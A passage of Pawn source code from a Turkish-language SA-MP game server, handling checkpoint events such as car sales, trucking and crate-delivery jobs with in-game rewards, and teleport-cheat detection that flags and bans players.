				format(string, sizeof(string), "Aracý $%d'a sattýn. Tekrar satabilmek için 12 dakika beklemen gerek.", money);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				GivePlayerCash(playerid, money);
  				PlayerInfo[playerid][pCarTime] = 720;
 				CP[playerid] = 0;
				DisablePlayerCheckpoint(playerid);
				SetVehicleToRespawn(vehicleid);
				for(new i = 0; i < sizeof(FamilyInfo); i++)
				{
					if(strcmp(Points[mypoint][Owner], FamilyInfo[i][FamilyName], true) == 0)
					{
						FamilyInfo[i][FamilyBank] = FamilyInfo[i][FamilyBank]+(money/2);
					}
				 }
			}
			GameTextForPlayer(playerid, "~y~Araci Sattin", 2500, 1);
			CP[playerid] = 0;
			DisablePlayerCheckpoint(playerid);
			if(GetVehicleModel(vehicleid)==525&&IsTrailerAttachedToVehicle(vehicleid))
			{
				SetVehicleToRespawn(GetVehicleTrailer(vehicleid));
			}
			else
			{
				SetVehicleToRespawn(vehicleid);
			}

			SetTimerEx("RespawnVehicleFunction", 3000, false, "d", gLastCar[playerid]);
		}
		else
		{
		    CP[playerid] = 0;
			GameTextForPlayer(playerid, "Arabada deðil", 5000, 1);
			DisablePlayerCheckpoint(playerid);
		}
	}

	if(TaxiCallTime[playerid] > 0 && TaxiAccepted[playerid] < 999)
	{
		TaxiAccepted[playerid] = 999;
		GameTextForPlayer(playerid, "~w~Hedefe geldin", 5000, 1);
		TaxiCallTime[playerid] = 0;
		DisablePlayerCheckpoint(playerid);
	}
	else if(EMSCallTime[playerid] > 0 && EMSAccepted[playerid] < INVALID_PLAYER_ID)
	{
	    if(GetPVarInt(EMSAccepted[playerid], "Injured") == 1)
	    {
	    	SendEMSQueue(EMSAccepted[playerid],2);
	    	EMSAccepted[playerid] = INVALID_PLAYER_ID;
	    	GameTextForPlayer(playerid, "~w~Hedefe geldin", 5000, 1);
	    	EMSCallTime[playerid] = 0;
	    	DisablePlayerCheckpoint(playerid);
		}
		else
		{
            EMSAccepted[playerid] = INVALID_PLAYER_ID;
		    GameTextForPlayer(playerid, "~r~Yarali hayatini kaybetti", 5000, 1);
		    EMSCallTime[playerid] = 0;
	    	DisablePlayerCheckpoint(playerid);
		}
	}
	else if(BusCallTime[playerid] > 0 && BusAccepted[playerid] < 999)
	{
		BusAccepted[playerid] = 999;
		GameTextForPlayer(playerid, "~w~Hedefe geldin", 5000, 1);
		BusCallTime[playerid] = 0;
		DisablePlayerCheckpoint(playerid);
	}
	else if(MedicCallTime[playerid] > 0 && MedicAccepted[playerid] < 999)
	{
		MedicAccepted[playerid] = 999;
		GameTextForPlayer(playerid, "~w~Yaraliya Eristin", 5000, 1);
		MedicCallTime[playerid] = 0;
		DisablePlayerCheckpoint(playerid);
	}
	else
	{
		switch (gPlayerCheckpointStatus[playerid])
		{
			case CHECKPOINT_HOME:
			{
				PlayerPlaySound(playerid, 1058, 0.0, 0.0, 0.0);
				new i = hInviteHouse[playerid];
				DisablePlayerCheckpoint(playerid);
				gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;
    			Streamer_UpdateEx(playerid, HouseInfo[i][hInteriorX],HouseInfo[i][hInteriorY],HouseInfo[i][hInteriorZ]);
				SetPlayerInterior(playerid,HouseInfo[i][hHInteriorWorld]);
				if(HouseInfo[i][hCustomInterior] == 1)
				{
			    	LoadObjectsForPlayer(playerid);
		        }
				SetPlayerPos(playerid,HouseInfo[i][hInteriorX],HouseInfo[i][hInteriorY],HouseInfo[i][hInteriorZ]);
				GameTextForPlayer(playerid, "~w~Eve Hosgeldin", 5000, 1);
				PlayerInfo[playerid][pInt] = HouseInfo[i][hHInteriorWorld];
				PlayerInfo[playerid][pVW] = i+60000;
				SetPlayerVirtualWorld(playerid, i+60000);
				hInviteOffer[playerid] = 999;
				hInviteHouse[playerid] = INVALID_HOUSE_ID;
			}
			case CHECKPOINT_LOADTRUCK:
			{
			    if(IsPlayerInRangeOfPoint(playerid, 6, 2197.660644, -2662.190185, 13.546875))
			    {
				    new vehicleid = GetPlayerVehicleID(playerid);
	   				if(IsATruckerCar(vehicleid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		    		{
				    	PlayerPlaySound(playerid, 1058, 0.0, 0.0, 0.0);
				    	DisablePlayerCheckpoint(playerid);
				    	gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;
						TogglePlayerControllable(playerid, 0);
						SetPVarInt(playerid, "IsFrozen", 1);
						ShowPlayerDialogEx(playerid,DIALOG_LOADTRUCK,DIALOG_STYLE_LIST,"Ne teslimatý yapmak istiyorsun?","{00F70C}Legal malzemeler {FFFFFF}(risk yok fakat bonusta yok)\n{FF0606}Illegal malzemeler {FFFFFF}(yakalanma riski var fakat bonusta var.)","Seç","Iptal");
					}
					else return SendClientMessage(playerid, COLOR_GREY, "Ocean Docks kamyonu sürmüyorsun.");
				}
			}
			case CHECKPOINT_RETURNTRUCK:
			{
			    if(!IsPlayerInRangeOfPoint(playerid, 6, 2225.343261, -2635.977294, 13.438463))
			    {// In the case the player finds a way to exploit the checkpoint to different location
                    CancelTruckDelivery(playerid);
                    SendClientMessage(playerid, COLOR_REALRED, "Hata: Yanlýþ checkpointe gittin. Teslimat tamamen iptal edildi.");
					return 1;
			    }

			    new vehicleid = GetPlayerVehicleID(playerid);
   				if(!IsATruckerCar(vehicleid))
   				{// Patch for an exploit
   				    CancelTruckDelivery(playerid);
   				    SendClientMessage(playerid, COLOR_REALRED, "Hata: Ocean Docks kamyonu sürmüyorsun. Teslimat tamamen iptal edildi.");
   				    return 1;
   				}

 				if(GetPVarInt(playerid, "tpTruckRunTimer") != 0)
				{
  					new string[128];
					format(string, sizeof(string), "{AA3333}AdminUyarýsý{FFFF00}: %s (ID %d) adlý oyuncu muhtemelen  teleport hilesi ile kamyonculuk yapýyor.", GetPlayerNameEx(playerid), playerid);
  					ABroadCast(COLOR_YELLOW, string, 2);

  					format(string, sizeof(string), "%s muhtemelen teleport hilesi ile kamyonculuk yapýyor.", GetPlayerNameEx(playerid));
  					AddAutomatedFlag(playerid, string);
    				// format(string, sizeof(string), "%s (ID %d) is possibly teleport truckrunning.", GetPlayerNameEx(playerid), playerid);
	    			// Log("logs/hack.log", string);
	    			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Teslimatý baþarýlý bir þekilde gerçekleþtirip kamyonu geri getirdiðin için  $100 aldýn.");
                    CancelTruckDelivery(playerid);

     				SetPVarInt(playerid, "_TP_HACK_WARNINGS", GetPVarInt(playerid,"_TP_HACK_WARNINGS")+1);

  					if(GetPVarInt(playerid,"_TP_HACK_WARNINGS") >= 3)
  					{
   						format(string, sizeof(string), "AdminKomutu: %s adlý oyuncu banlandý, sebep: Teleport Hilesi.", GetPlayerNameEx(playerid));
						SendClientMessageToAllEx(COLOR_LIGHTRED, string);
						PlayerInfo[playerid][pBanned] = 3;
						new playerip[32];
						GetPlayerIp(playerid, playerip, sizeof(playerip));
						format(string, sizeof(string), "AdminKomutu: %s (IP:%s) adlý oyuncu banlandý, sebep: Teleport Hilesi.", GetPlayerNameEx(playerid), playerip);
						PlayerInfo[playerid][pBanned] = 3;
						Log("logs/ban.log", string);
   						new ip[32];
						GetPlayerIp(playerid,ip,sizeof(ip));
						AddBan(ip);
						Kick(playerid);
						TotalAutoBan++;
					}
	    			return 1;
				}

				if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
	    		{
	        		SendClientMessage(playerid, COLOR_WHITE, "Kamyonun içinde deðilsin.");
	        		return 1;
	    		}
	    		if(TruckUsed[playerid] != INVALID_VEHICLE_ID && vehicleid != TruckUsed[playerid])
	    		{
	        		SendClientMessage(playerid, COLOR_WHITE, "Bu senin kullandýðýn kamyon deðil, ücretini alabilmek için kendi kamyonunu getir!");
	        		return 1;
	    		}

			    PlayerPlaySound(playerid, 1058, 0.0, 0.0, 0.0);
			    DisablePlayerCheckpoint(playerid);
			    gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;

			    SetVehicleToRespawn(vehicleid);

   				new string[128], payment;
				new level = PlayerInfo[playerid][pTruckSkill];
				if(level >= 0 && level < 50) payment = 500;
				else if(level >= 50 && level < 100) payment = 750;
				else if(level >= 100 && level < 200) payment = 1000;
				else if(level >= 200 && level < 400) payment = 1250;
				else if(level >= 400) payment = 2000;

				GivePlayerCash(playerid, payment);
    			format(string, sizeof(string), "* Teslimatý baþarýlý bir þekilde gerçekleþtirip kamyonu geri getirdiðin için $%d para aldýn.", payment);
			    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);

                new truckdeliver = GetPVarInt(playerid, "TruckDeliver");
				/*if(truckdeliver == 11)
				{
				    if(PlayerInfo[playerid][pConnectTime] > 1)
				    {
   					 SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Ýllegal silah taþýma riski aldýðýndan dolayý, bonus olarak 9mm aldýn.");
			    		GivePlayerValidWeapon(playerid, 22, 60000);
					}
					else SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Silah taþýma yasaðýn olduðundan dolayý, bonus silahýný alamadýn.");
				}*/
			 	if(truckdeliver == 12)
				{
				    new randomweapon = Random(1, 3);
					if(PlayerInfo[playerid][pConnectTime] < 2)
				    {
				        SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Silah taþýma yasaðýn olduðundan dolayý, bonus silahýný alamadýn.");
				    }
					else if(randomweapon == 1)
					{
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Ýllegal silah taþýma riski aldýðýndan dolayý, bonus olarak 9mm aldýn.");
						GivePlayerValidWeapon(playerid, 22, 60000);
					}
					else if(randomweapon == 2)
					{
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Ýllegal silah taþýma riski aldýðýndan dolayý, bonus olarak Susturuculu tabanca aldýn.");
						GivePlayerValidWeapon(playerid, 23, 60000);
					}
				}
				else if(truckdeliver == 13)
				{
				    new randomweapon = Random(1, 4);
					if(PlayerInfo[playerid][pConnectTime] < 2)
				    {
				        SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Silah taþýma yasaðýn olduðundan dolayý, bonus silahýný alamadýn.");
				    }
					else if(randomweapon == 1)
					{
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Ýllegal silah taþýma riski aldýðýndan dolayý, bonus olarak 9mm aldýn.");
						GivePlayerValidWeapon(playerid, 22, 60000);
					}
					else if(randomweapon == 2)
					{
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Ýllegal silah taþýma riski aldýðýndan dolayý, bonus olarak Susturuculu tabanca aldýn.");
						GivePlayerValidWeapon(playerid, 23, 60000);
					}
					else if(randomweapon == 3)
					{
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Ýllegal silah taþýma riski aldýðýndan dolayý, bonus olarak Shotgun aldýn.");
						GivePlayerValidWeapon(playerid, 25, 60000);
					}
				}
				else if(truckdeliver == 14)
				{
				    new randomweapon = Random(1, 5);
					if(PlayerInfo[playerid][pConnectTime] < 2)
				    {
				        SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Silah taþýma yasaðýn olduðundan dolayý, bonus silahýný alamadýn.");
				    }
					else if(randomweapon == 1)
					{
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Ýllegal silah taþýma riski aldýðýndan dolayý, bonus olarak 9mm aldýn.");
						GivePlayerValidWeapon(playerid, 22, 60000);
					}
					else if(randomweapon == 2)
					{
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Ýllegal silah taþýma riski aldýðýndan dolayý, bonus olarak Susturuculu tabanca aldýn.");
						GivePlayerValidWeapon(playerid, 23, 60000);
					}
					else if(randomweapon == 3)
					{
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Ýllegal silah taþýma riski aldýðýndan dolayý, bonus olarak Shotgun aldýn.");
						GivePlayerValidWeapon(playerid, 25, 60000);
					}
					else if(randomweapon == 4)
					{
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Ýllegal silah taþýma riski aldýðýndan dolayý, bonus olarak Rifle aldýn.");
						GivePlayerValidWeapon(playerid, 33, 60000);
					}
				}
				else if(truckdeliver == 15)
				{
				    new randomweapon = Random(1, 101);
					if(PlayerInfo[playerid][pConnectTime] < 2)
				    {
				        SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Silah taþýma yasaðýn olduðundan dolayý, bonus silahýný alamadýn.");
				    }
					else if(randomweapon >= 1 && randomweapon <= 45)
					{
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Ýllegal silah taþýma riski aldýðýndan dolayý, bonus olarak Shotgun aldýn.");
						GivePlayerValidWeapon(playerid, 25, 60000);
					}
					else if(randomweapon >= 46 && randomweapon <= 87)
					{
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Ýllegal silah taþýma riski aldýðýndan dolayý, bonus olarak Rifle aldýn.");
						GivePlayerValidWeapon(playerid, 33, 60000);
					}
					else if(randomweapon >= 88 && randomweapon <= 100)
					{
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Ýllegal silah taþýma riski aldýðýndan dolayý, bonus olarak Deagle aldýn.");
						GivePlayerValidWeapon(playerid, 24, 60000);
					}
				}
				/*else if(truckdeliver == 16)
				{
				    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Uyuþturucu taþýma riski aldýðýndan dolayý, bonus olarak 1gr pot ve 1gr crack aldýn.");
				    PlayerInfo[playerid][pPot] += 1;
				    PlayerInfo[playerid][pCrack] += 1;
				}*/
				else if(truckdeliver == 17)
				{
    				new drug = Random(1, 3);
					if(drug == 1)
					{
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Uyuþturucu taþýma riskini aldýðýndan dolayý, bonus olarak 1gr pot aldýn.");
						PlayerInfo[playerid][pPot] += 1;
					}
					else if(drug == 2)
					{
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Uyuþturucu taþýma riskini aldýðýndan dolayý, bonus olarak 1gr crack aldýn.");
						PlayerInfo[playerid][pCrack] += 1;
					}
				}
				else if(truckdeliver == 18)
				{
				    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Uyuþturucu taþýma riski aldýðýndan dolayý, bonus olarak 1gr pot ve 1gr crack aldýn.");
				    PlayerInfo[playerid][pPot] += 1;
				    PlayerInfo[playerid][pCrack] += 1;
				}
				else if(truckdeliver == 19)
				{
				    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Uyuþturucu taþýma riski aldýðýndan dolayý, bonus olarak 2gr pot ve 2gr crack aldýn.");
				    PlayerInfo[playerid][pPot] += 2;
				    PlayerInfo[playerid][pCrack] += 2;
				}
				else if(truckdeliver == 20)
				{
				    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Uyuþturucu taþýma riski aldýðýndan dolayý, bonus olarak 3gr pot ve 3gr crack aldýn.");
				    PlayerInfo[playerid][pPot] += 3;
				    PlayerInfo[playerid][pCrack] += 3;
				}
				else if(truckdeliver == 21)
				{
				    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Ýllegal materyal taþýma riskini aldýðýndan dolayý,bonus olarak 25 materyal aldýn.");
					PlayerInfo[playerid][pMats] += 25;
				}
				else if(truckdeliver == 22)
				{
				    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Ýllegal materyal taþýma riskini aldýðýndan dolayý,bonus olarak 50 materyal aldýn.");
					PlayerInfo[playerid][pMats] += 50;
				}
				else if(truckdeliver == 23)
				{
				    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Ýllegal materyal taþýma riskini aldýðýndan dolayý,bonus olarak 100 materyal aldýn.");
					PlayerInfo[playerid][pMats] += 100;
				}
				else if(truckdeliver == 24)
				{
				    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Ýllegal materyal taþýma riskini aldýðýndan dolayý,bonus olarak 150 materyal aldýn.");
					PlayerInfo[playerid][pMats] += 150;
				}
				else if(truckdeliver == 25)
				{
				    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Ýllegal materyal taþýma riskini aldýðýndan dolayý,bonus olarak 200 materyal aldýn.");
					PlayerInfo[playerid][pMats] += 200;
				}

				#if defined DOUBLE_EXP_ENABLED
					new hour,minuite,second;
					gettime(hour,minuite,second);
					if(DoubleEXPcheck(hour))
					{
				    	PlayerInfo[playerid][pTruckSkill] += 2;
				    	SendClientMessage(playerid, COLOR_YELLOW, "Ýki kat exp etkinliðinden dolayý 2 Yetenek Puaný kazandýnýz.");
					}
					else
					{
						SendClientMessage(playerid, COLOR_YELLOW, "Ýki kat exp etkinliði saatinde deðilseniz yalnýzca 1 Yetenek Puaný kazanýrsýnýz.");
						PlayerInfo[playerid][pTruckSkill]++;
					}
				#else
					PlayerInfo[playerid][pTruckSkill]++;
				#endif

				TruckUsed[playerid] = INVALID_VEHICLE_ID;
				DeletePVar(playerid, "TruckDeliver");
			}
			case CHECKPOINT_HITMAN:
			{
			    PlayerPlaySound(playerid, 1058, 0.0, 0.0, 0.0);
			    DisablePlayerCheckpoint(playerid);
			    gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;
			    SendClientMessage(playerid, COLOR_GRAD2, "Merkeze girmek için /gir yaz.");
			}
		}
	}

	for(new h = 0; h < MAX_POINTS; h++)
	{
		if(Points[h][Type] == 3 && GetPVarInt(playerid, "CrateDeliver") == 1 && IsPlayerInRangeOfPoint(playerid, 6.0, 2166.3772,-1675.3829,15.0859))
		{
			new string[128];
		    if(GetPVarInt(playerid, "tpDrugRunTimer") != 0) {
			   	format(string, sizeof(string), "{AA3333}AdminUyarýsý{FFFF00}: %s (ID %d) muhtemelen teleport hilesi ile uyuþturucu kasýyor.", GetPlayerNameEx(playerid), playerid);
			   	ABroadCast(COLOR_YELLOW, string, 2);

			   	format(string, sizeof(string), "%s muhtemelen teleport hilesi ile uyuþturucu kasýyor.", GetPlayerNameEx(playerid));
			   	AddAutomatedFlag(playerid, string);
			   	// format(string, sizeof(string), "%s (ID %d) is possibly teleport drugrunning.", GetPlayerNameEx(playerid), playerid);
			   	// Log("logs/hack.log", string);
			   	SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Uyuþturucu kutusu teslimatý yaptýðýndan dolayý $150 kazandýn.");
   				DeletePVar(playerid, "CrateDeliver");
				PlayerInfo[playerid][pCrates] = 0;

				SetPVarInt(playerid, "_TP_HACK_WARNINGS", GetPVarInt(playerid,"_TP_HACK_WARNINGS")+1);

  				if(GetPVarInt(playerid,"_TP_HACK_WARNINGS") >= 3)
  				{
   					format(string, sizeof(string), "AdminKomutu: %s adlý oyuncu banlandý, sebep: Teleport Hilesi.", GetPlayerNameEx(playerid));
					SendClientMessageToAllEx(COLOR_LIGHTRED, string);
					PlayerInfo[playerid][pBanned] = 3;
					new playerip[32];
					GetPlayerIp(playerid, playerip, sizeof(playerip));
					format(string, sizeof(string), "AdminKomutu: %s (IP:%s) adlý oyuncu banlandý, sebep: Teleport Hilesi.", GetPlayerNameEx(playerid), playerip);
					PlayerInfo[playerid][pBanned] = 3;
					Log("logs/ban.log", string);
   					new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					AddBan(ip);
					Kick(playerid);
					TotalAutoBan++;
				}
			   	return 1;
			}
			DisablePlayerCheckpoint(playerid);
			new level = PlayerInfo[playerid][pSmugSkill];
   			if(level >= 0 && level < 50)
			{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Uyuþturucu kutusu teslimatý yaptýðýndan dolayý $500 kazandýn.");
				GivePlayerCash(playerid, 500);
			}
			else if(level >= 50 && level < 100)
			{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Uyuþturucu kutusu teslimatý yaptýðýndan dolayý $750 kazandýn.");
				GivePlayerCash(playerid, 750);
			}
			else if(level >= 100 && level < 200)
			{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Uyuþturucu kutusu teslimatý yaptýðýndan dolayý $1000 kazandýn.");
				GivePlayerCash(playerid, 1000);
			}
			else if(level >= 200 && level < 400)
			{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Uyuþturucu kutusu teslimatý yaptýðýndan dolayý $1250 kazandýn.");
				GivePlayerCash(playerid, 1250);
			}
			else if(level >= 400)
			{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Uyuþturucu kutusu teslimatý yaptýðýndan dolayý $1500 kazandýn.");
				GivePlayerCash(playerid, 1500);
			}
			DeletePVar(playerid, "CrateDeliver");
			PlayerInfo[playerid][pCrates] = 0;
			Points[h][Stock] += 10;

			#if defined DOUBLE_EXP_ENABLED
				new hour,minuite,second;
				gettime(hour,minuite,second);
				if(DoubleEXPcheck(hour))
				{
				    PlayerInfo[playerid][pSmugSkill] += 2;
				    SendClientMessage(playerid, COLOR_YELLOW, "Ýki kat exp etkinliðinden dolayý 2 Yetenek Puaný kazandýnýz.");
				}
				else
				{
					SendClientMessage(playerid, COLOR_YELLOW, "Ýki kat exp etkinliði saatinde deðilseniz yalnýzca 1 Yetenek Puaný kazanýrsýnýz.");
					PlayerInfo[playerid][pSmugSkill]++;
				}
			#else
				PlayerInfo[playerid][pSmugSkill]++;
			#endif

			format(string, sizeof(string), " ALINABILIR POT: %d gram.", Points[h][Stock]);
			UpdateDynamic3DTextLabelText(Points[h][TextLabel], COLOR_YELLOW, string);
			return 1;
		}
		else if(Points[h][Type] == 4 && GetPVarInt(playerid, "CrateDeliver") == 2 && IsPlayerInRangeOfPoint(playerid, 6.0, 2354.2808,-1169.2959,28.0066))
		{
			new string[128];
		    if(GetPVarInt(playerid, "tpDrugRunTimer") != 0)
	    	{
			   	format(string, sizeof(string), "{AA3333}AdminUyarýsý{FFFF00}: %s (ID %d) muhtemelen teleport hilesi ile uyuþturucu kasýyor.", GetPlayerNameEx(playerid), playerid);
			   	ABroadCast(COLOR_YELLOW, string, 2);

			   	format(string, sizeof(string), "%s muhtemelen teleport hilesi ile uyuþturucu kasýyor.", GetPlayerNameEx(playerid));
			   	AddAutomatedFlag(playerid, string);
			   	// format(string, sizeof(string), "%s (ID %d) is possibly teleport drugrunning.", GetPlayerNameEx(playerid), playerid);
			   	// Log("logs/hack.log", string);
			   	SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Uyuþturucu kutusu teslimatý yaptýðýndan dolayý $125 kazandýn.");
   				DeletePVar(playerid, "CrateDeliver");
				PlayerInfo[playerid][pCrates] = 0;

				SetPVarInt(playerid, "_TP_HACK_WARNINGS", GetPVarInt(playerid,"_TP_HACK_WARNINGS")+1);

  				if(GetPVarInt(playerid,"_TP_HACK_WARNINGS") >= 3)
  				{
   					format(string, sizeof(string), "AdminKomutu: %s adlý oyuncu banlandý, sebep: Teleport Hilesi.", GetPlayerNameEx(playerid));
					SendClientMessageToAllEx(COLOR_LIGHTRED, string);
					PlayerInfo[playerid][pBanned] = 3;
					new playerip[32];
					GetPlayerIp(playerid, playerip, sizeof(playerip));
					format(string, sizeof(string), "AdminKomutu: %s (IP:%s) adlý oyuncu banlandý, sebep: Teleport Hilesi.", GetPlayerNameEx(playerid), playerip);
					PlayerInfo[playerid][pBanned] = 3;
					Log("logs/ban.log", string);
   					new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					AddBan(ip);
					Kick(playerid);
					TotalAutoBan++;
				}
				return 1;
			}
			DisablePlayerCheckpoint(playerid);
			new level = PlayerInfo[playerid][pSmugSkill];

			if(level >= 0 && level < 50)
			{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Uyuþturucu kutusu teslimatý yaptýðýndan dolayý $250 kazandýn.");
				GivePlayerCash(playerid, 250);
			}
			else if(level >= 50 && level < 100)
			{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Uyuþturucu kutusu teslimatý yaptýðýndan dolayý $300 kazandýn.");
				GivePlayerCash(playerid, 300);
			}
			else if(level >= 100 && level < 200)
			{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Uyuþturucu kutusu teslimatý yaptýðýndan dolayý $350 kazandýn.");
				GivePlayerCash(playerid, 350);
			}
			else if(level >= 200 && level < 400)
			{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Uyuþturucu kutusu teslimatý yaptýðýndan dolayý $400 kazandýn.");
				GivePlayerCash(playerid, 400);
			}
			else if(level >= 400)
			{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Uyuþturucu kutusu teslimatý yaptýðýndan dolayý $450 kazandýn.");
				GivePlayerCash(playerid, 450);
			}
			DeletePVar(playerid, "CrateDeliver");
			PlayerInfo[playerid][pCrates] = 0;
			Points[h][Stock] += 10;

			#if defined DOUBLE_EXP_ENABLED
				new hour,minuite,second;
				gettime(hour,minuite,second);
				if(DoubleEXPcheck(hour))
				{
				    PlayerInfo[playerid][pSmugSkill] += 2;
				    SendClientMessage(playerid, COLOR_YELLOW, "Ýki kat exp etkinliðinden dolayý 2 Yetenek Puaný kazandýnýz.");
				}
				else
				{
					SendClientMessage(playerid, COLOR_YELLOW, "Ýki kat exp etkinliði saatinde deðilseniz yalnýzca 1 Yetenek Puaný kazanýrsýnýz.");
					PlayerInfo[playerid][pSmugSkill]++;
				}
			#else
				PlayerInfo[playerid][pSmugSkill]++;
			#endif

			format(string, sizeof(string), " ALINABILIR CRACK: %d gram.", Points[h][Stock]);
			UpdateDynamic3DTextLabelText(Points[h][TextLabel], COLOR_YELLOW, string);
			return 1;
		}
		else if(Points[h][Type] == 2 && GetPVarInt(playerid, "MatDeliver") == Points[h][MatPoint] && IsPlayerInRangeOfPoint(playerid, 6.0, Points[h][Pointx], Points[h][Pointy], Points[h][Pointz]))
		{
			if(GetPVarInt(playerid, "Packages") > 0)
			{
			    new
			        iOriginalMats = PlayerInfo[playerid][pMats];

				new string[128];
				if(GetPVarInt(playerid, "tpMatRunTimer") != 0)
			    {
			    	format(string, sizeof(string), "{AA3333}AdminUyarýsý{FFFF00}: %s (ID %d) adlý oyuncu hile ile materyal kasýyor olabilir.", GetPlayerNameEx(playerid), playerid);
			    	ABroadCast(COLOR_YELLOW, string, 2);

			    	format(string, sizeof(string), "%s muhtemelen teleport hilesi ile materyal kasýyor.", GetPlayerNameEx(playerid));
			    	AddAutomatedFlag(playerid, string);
			    	// format(string, sizeof(string), "%s (ID %d) is possibly teleport matrunning.", GetPlayerNameEx(playerid), playerid);
			    	// Log("logs/hack.log", string);
			    	format(string, sizeof(string), "Fabrika sana bu teslimat için 250 materyal verdi. Bundan mnde %d materyalin vardý.", iOriginalMats);
			    	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
   					DeletePVar(playerid, "Packages");
					DeletePVar(playerid, "MatDeliver");
					DisablePlayerCheckpoint(playerid);

					SetPVarInt(playerid, "_TP_HACK_WARNINGS", GetPVarInt(playerid,"_TP_HACK_WARNINGS")+1);

  					if(GetPVarInt(playerid,"_TP_HACK_WARNINGS") >= 3)
  					{
   						format(string, sizeof(string), "AdminKomutu: %s adlý oyuncu banlandý, sebep: Teleport Hilesi.", GetPlayerNameEx(playerid));
						SendClientMessageToAllEx(COLOR_LIGHTRED, string);
						PlayerInfo[playerid][pBanned] = 3;
						new playerip[32];
						GetPlayerIp(playerid, playerip, sizeof(playerip));
						format(string, sizeof(string), "AdminKomutu: %s (IP:%s) adlý oyuncu banlandý, sebep: Teleport Hilesi.", GetPlayerNameEx(playerid), playerip);
						PlayerInfo[playerid][pBanned] = 3;
						Log("logs/ban.log", string);
   						new ip[32];
						GetPlayerIp(playerid,ip,sizeof(ip));
						AddBan(ip);
						Kick(playerid);
						TotalAutoBan++;
					}
			    	return 1;
				}
				new payout = (25)*(GetPVarInt(playerid, "Packages"));


				format(string, sizeof(string), "Fabrika sana bu teslimat için 500 materyal verdi. Bundan mnde %d materyalin vardý.", iOriginalMats);
			    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[playerid][pMats] += 250;
				DeletePVar(playerid, "Packages");
				DeletePVar(playerid, "MatDeliver");
				DisablePlayerCheckpoint(playerid);
				for(new p = 0; p < sizeof(FamilyInfo); p++)
				{
					if(strcmp(Points[h][Owner], FamilyInfo[p][FamilyName], true) == 0)
					{
						FamilyInfo[p][FamilyBank] = FamilyInfo[p][FamilyBank]+(payout/3);
						//SendClientMessage(playerid, COLOR_WHITE, " Family owner recieved 33 percent of the cost.");
					}
				}
				return 1;
			}
		}
	}
	DisablePlayerCheckpoint(playerid);
	return 1;
}

forward ShowPlayerBeaconForCops(playerid);
public ShowPlayerBeaconForCops(playerid)
{
	foreach(Player, i)
	{
		if(IsACop(i))
		{
			SetPlayerMarkerForPlayer(i, playerid, COP_GREEN_COLOR);
		}
	}
	return 1;
}

forward HidePlayerBeaconForCops(playerid);
public HidePlayerBeaconForCops(playerid)
{
	foreach(Player, i)
	{
		if(IsACop(i))
		{
			SetPlayerMarkerForPlayer(i, playerid, TEAM_HIT_COLOR);
		}
	}
	SetPlayerToTeamColor(playerid);
	return 1;
}

forward ShowPlayerBeaconForMedics(playerid);
public ShowPlayerBeaconForMedics(playerid)
{
	foreach(Player, i)
	{
		if(IsInLSFMD(i))
		{
			SetPlayerMarkerForPlayer(i, playerid, COP_GREEN_COLOR);
		}
	}
	return 1;
}

forward HidePlayerBeaconForMedics(playerid);
public HidePlayerBeaconForMedics(playerid)
{
	foreach(Player, i)
	{
		if(IsInLSFMD(i))
		{
			SetPlayerMarkerForPlayer(i, playerid, TEAM_HIT_COLOR);
		}
	}
	SetPlayerToTeamColor(playerid);
	return 1;
}

public OnPlayerLeaveCheckpoint(playerid)
{
	return 1;
}

public OnPlayerEnterRaceCheckpoint(playerid)
{
	return 1;
}

public OnPlayerLeaveRaceCheckpoint(playerid)
{
	return 1;
}

public OnRconCommand(cmd[])
{
	return 1;
}

public OnPlayerRequestSpawn(playerid)
{
	return 1;
}

